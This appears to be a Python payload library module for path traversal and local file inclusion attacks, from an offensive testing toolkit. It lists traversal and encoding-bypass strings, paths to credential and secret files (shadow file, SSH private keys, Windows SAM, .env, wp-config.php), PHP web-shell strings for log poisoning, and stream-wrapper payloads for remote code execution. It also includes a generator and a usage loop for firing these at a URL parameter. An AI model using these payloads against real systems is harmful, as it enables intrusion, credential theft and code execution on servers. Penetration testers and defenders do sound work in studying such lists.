#!/usr/bin/env python3
"""
Path Traversal & File Inclusion Payloads
========================================

Payloads for Local File Inclusion (LFI) and Path Traversal attacks.

How Path Traversal Works:
-------------------------
Path traversal allows reading files outside the intended directory by
using ../ sequences to navigate up the directory tree.

Vulnerable code example:
    filename = request.GET['file']
    content = open(f'/var/www/files/{filename}').read()  # No validation!

Attack:
    ?file=../../../etc/passwd
    Reads: /var/www/files/../../../etc/passwd = /etc/passwd

How LFI Works:
--------------
LFI occurs when user input is used in include/require statements,
allowing inclusion of local files, often leading to code execution.

Vulnerable code (PHP):
    include($_GET['page'] . '.php');

Attack:
    ?page=../../../etc/passwd%00
    Includes: /etc/passwd (null byte truncates .php in older PHP)
"""

# ============================================================
# BASIC TRAVERSAL
# ============================================================
# Standard directory traversal sequences

BASIC_TRAVERSAL = [
    # Unix-style
    "../",
    "../../",
    "../../../",
    "../../../../",
    "../../../../../",
    "../../../../../../",
    "../../../../../../../",
    "../../../../../../../../",
    
    # Windows-style
    "..\\",
    "..\\..\\",
    "..\\..\\..\\",
    "..\\..\\..\\..\\",
    "..\\..\\..\\..\\..\\",
    
    # Mixed
    "..\\../",
    "../..\\",
]

# ============================================================
# ENCODING BYPASS
# ============================================================
# Encoded versions to bypass filters

ENCODED_TRAVERSAL = [
    # URL encoding
    "%2e%2e%2f",            # ../
    "%2e%2e/",              # ../
    "..%2f",                # ../
    "%2e%2e%5c",            # ..\
    
    # Double URL encoding
    "%252e%252e%252f",      # ../
    "%252e%252e/",          # ../
    "..%252f",              # ../
    
    # Unicode/overlong UTF-8
    "..%c0%af",             # ../
    "..%c1%9c",             # ..\
    "%c0%ae%c0%ae%c0%af",   # ../
    
    # 16-bit Unicode
    "..%u2215",
    "..%u2216",
    
    # Mixed encoding
    ".%2e/",
    "%2e./",
    ".%252e/",
    
    # Null byte (old PHP)
    "../../../etc/passwd%00",
    "../../../etc/passwd%00.jpg",
    
    # Double dots alternatives
    "....//",
    "....\\\\",
    "..../",
    "....\\",
]

# ============================================================
# FILTER BYPASS TECHNIQUES
# ============================================================
# Various techniques to bypass input validation

FILTER_BYPASS = [
    # Nested traversal (filter removes ../ once)
    "....//",
    r"....\/",
    r"....\\\/",
    "..../....//",
    
    # Absolute paths
    "/etc/passwd",
    "//etc/passwd",
    "/./etc/passwd",
    
    # Using current directory
    "./../../../../etc/passwd",
    "./../../../etc/passwd",
    
    # Trailing characters
    "../../../etc/passwd/",
    "../../../etc/passwd/.",
    "../../../etc/passwd./",
    
    # Case variations (Windows)
    "..\\..\\..\\WINDOWS\\system32\\config\\sam",
    "..\\..\\..\\windows\\SYSTEM32\\CONFIG\\sam",
    
    # UNC paths (Windows)
    "\\\\localhost\\c$\\windows\\win.ini",
    "//localhost/c$/windows/win.ini",
]

# ============================================================
# LINUX SENSITIVE FILES
# ============================================================

LINUX_FILES = [
    # System files
    "/etc/passwd",
    "/etc/shadow",
    "/etc/group",
    "/etc/hosts",
    "/etc/hostname",
    "/etc/motd",
    "/etc/issue",
    "/etc/resolv.conf",
    "/etc/crontab",
    "/etc/fstab",
    
    # User files
    "/root/.bashrc",
    "/root/.bash_history",
    "/root/.ssh/id_rsa",
    "/root/.ssh/id_rsa.pub",
    "/root/.ssh/authorized_keys",
    "/root/.ssh/known_hosts",
    "/home/{user}/.bashrc",
    "/home/{user}/.bash_history",
    "/home/{user}/.ssh/id_rsa",
    
    # Process info
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/proc/self/status",
    "/proc/self/fd/0",
    "/proc/self/fd/1",
    "/proc/self/fd/2",
    "/proc/version",
    "/proc/net/tcp",
    "/proc/net/udp",
    "/proc/net/arp",
    "/proc/sched_debug",
    "/proc/mounts",
    "/proc/net/fib_trie",
    
    # Logs
    "/var/log/auth.log",
    "/var/log/syslog",
    "/var/log/messages",
    "/var/log/apache2/access.log",
    "/var/log/apache2/error.log",
    "/var/log/nginx/access.log",
    "/var/log/nginx/error.log",
    "/var/log/mail.log",
    "/var/log/secure",
    "/var/log/lastlog",
    "/var/log/wtmp",
    "/var/log/btmp",
    
    # Config files
    "/etc/apache2/apache2.conf",
    "/etc/apache2/sites-enabled/000-default.conf",
    "/etc/nginx/nginx.conf",
    "/etc/nginx/sites-enabled/default",
    "/etc/mysql/my.cnf",
    "/etc/php/7.4/fpm/php.ini",
    "/etc/ssh/sshd_config",
    "/etc/vsftpd.conf",
    "/etc/redis/redis.conf",
]

# ============================================================
# WINDOWS SENSITIVE FILES
# ============================================================

WINDOWS_FILES = [
    # System files
    "C:\\Windows\\System32\\config\\SAM",
    "C:\\Windows\\System32\\config\\SYSTEM",
    "C:\\Windows\\System32\\config\\SECURITY",
    "C:\\Windows\\System32\\config\\SOFTWARE",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "C:\\Windows\\win.ini",
    "C:\\Windows\\system.ini",
    "C:\\Windows\\php.ini",
    "C:\\Windows\\debug\\NetSetup.log",
    "C:\\Windows\\Panther\\Unattend.xml",
    "C:\\Windows\\Panther\\Unattended.xml",
    
    # IIS
    "C:\\inetpub\\wwwroot\\web.config",
    "C:\\inetpub\\logs\\LogFiles\\",
    "C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config",
    
    # User files
    "C:\\Users\\Administrator\\Desktop\\",
    "C:\\Users\\Administrator\\.ssh\\id_rsa",
    "C:\\Users\\Administrator\\AppData\\",
    
    # Logs
    "C:\\Windows\\System32\\winevt\\Logs\\Security.evtx",
    "C:\\Windows\\System32\\winevt\\Logs\\System.evtx",
]

# ============================================================
# WEB APPLICATION FILES
# ============================================================

WEB_APP_FILES = [
    # Configuration
    ".env",
    "../.env",
    "../../.env",
    "config.php",
    "config.yml",
    "config.json",
    "settings.py",
    "application.properties",
    "application.yml",
    "database.yml",
    "secrets.yml",
    "credentials.json",
    "wp-config.php",
    
    # Source code
    "index.php",
    "index.py",
    "app.py",
    "main.py",
    "routes.py",
    "views.py",
    "models.py",
    
    # Package managers
    "package.json",
    "package-lock.json",
    "composer.json",
    "Gemfile",
    "requirements.txt",
    "Pipfile",
    
    # CI/CD
    ".gitlab-ci.yml",
    ".github/workflows/",
    "Jenkinsfile",
    ".travis.yml",
    ".circleci/config.yml",
    
    # Docker
    "Dockerfile",
    "docker-compose.yml",
    ".dockerignore",
    
    # Git (source code disclosure)
    ".git/config",
    ".git/HEAD",
    ".git/index",
    ".git/logs/HEAD",
    ".git/refs/heads/master",
    ".gitignore",
]

# ============================================================
# LOG POISONING PAYLOADS
# ============================================================
# Inject PHP into logs, then include the log file

LOG_POISONING = {
    "user_agent_injection": [
        "<?php system($_GET['cmd']); ?>",
        "<?php echo shell_exec($_GET['cmd']); ?>",
        "<?php passthru($_GET['cmd']); ?>",
        "<?=`$_GET[cmd]`?>",
    ],
    
    "common_log_paths": [
        # Apache
        "/var/log/apache2/access.log",
        "/var/log/apache2/error.log",
        "/var/log/apache/access.log",
        "/var/log/httpd/access_log",
        "/var/log/httpd/error_log",
        
        # Nginx
        "/var/log/nginx/access.log",
        "/var/log/nginx/error.log",
        
        # Other
        "/var/log/vsftpd.log",
        "/var/log/mail.log",
        "/var/log/sshd.log",
        "/proc/self/fd/0",  # stdin
        "/proc/self/environ",
    ],
}

# ============================================================
# PHP WRAPPERS
# ============================================================
# PHP stream wrappers for advanced exploitation

PHP_WRAPPERS = [
    # Base64 encode source code
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=config.php",
    "php://filter/convert.base64-encode/resource=../config.php",
    
    # Read raw
    "php://filter/read=string.rot13/resource=index.php",
    
    # RCE via input
    "php://input",  # POST body as include content
    
    # Data wrapper (RCE)
    "data://text/plain,<?php system($_GET['cmd']); ?>",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
    
    # Expect wrapper (RCE if enabled)
    "expect://id",
    "expect://ls",
    
    # Zip wrapper
    "zip://uploads/evil.zip#shell.php",
    
    # Phar wrapper
    "phar://uploads/evil.phar/test.txt",
]

# ============================================================
# FULL PAYLOADS
# ============================================================
# Complete traversal payloads for common files

def generate_traversal_payloads(target_file: str, depth: int = 10) -> list:
    """Generate traversal payloads at various depths"""
    payloads = []
    
    for i in range(1, depth + 1):
        # Unix
        payloads.append("../" * i + target_file)
        payloads.append("..%2f" * i + target_file)
        payloads.append("..../" * i + target_file)
        
        # Windows
        payloads.append("..\\" * i + target_file.replace("/", "\\"))
        payloads.append("..%5c" * i + target_file.replace("/", "\\"))
    
    return payloads


FULL_UNIX_PAYLOADS = []
for depth in range(1, 10):
    prefix = "../" * depth
    FULL_UNIX_PAYLOADS.extend([
        f"{prefix}etc/passwd",
        f"{prefix}etc/shadow",
        f"{prefix}etc/hosts",
        f"{prefix}proc/self/environ",
        f"{prefix}var/log/apache2/access.log",
    ])

FULL_WINDOWS_PAYLOADS = []
for depth in range(1, 10):
    prefix = "..\\" * depth
    FULL_WINDOWS_PAYLOADS.extend([
        f"{prefix}windows\\win.ini",
        f"{prefix}windows\\system32\\drivers\\etc\\hosts",
        f"{prefix}inetpub\\wwwroot\\web.config",
    ])


# ============================================================
# ALL PAYLOADS
# ============================================================

ALL_TRAVERSAL = BASIC_TRAVERSAL + ENCODED_TRAVERSAL + FILTER_BYPASS
ALL_FILES = LINUX_FILES + WINDOWS_FILES + WEB_APP_FILES


# ============================================================
# USAGE
# ============================================================

if __name__ == "__main__":
    print("""
Path Traversal & LFI Payload Library
====================================

Categories:
  - BASIC_TRAVERSAL ({} payloads) - Standard ../ sequences
  - ENCODED_TRAVERSAL ({} payloads) - URL/Unicode encoded
  - FILTER_BYPASS ({} payloads) - Filter evasion
  - LINUX_FILES ({} paths) - Sensitive Linux files
  - WINDOWS_FILES ({} paths) - Sensitive Windows files
  - WEB_APP_FILES ({} paths) - Web app configs
  - PHP_WRAPPERS ({} wrappers) - PHP stream wrappers

Usage:
  from payloads.traversal import BASIC_TRAVERSAL, LINUX_FILES
  
  for traversal in BASIC_TRAVERSAL:
      for file in LINUX_FILES[:5]:
          payload = traversal + file.lstrip("/")
          test_param(url, "file", payload)

Generate custom:
  from payloads.traversal import generate_traversal_payloads
  
  payloads = generate_traversal_payloads("etc/passwd", depth=8)
  for p in payloads:
      test(p)
""".format(
        len(BASIC_TRAVERSAL), len(ENCODED_TRAVERSAL), len(FILTER_BYPASS),
        len(LINUX_FILES), len(WINDOWS_FILES), len(WEB_APP_FILES),
        len(PHP_WRAPPERS)
    ))
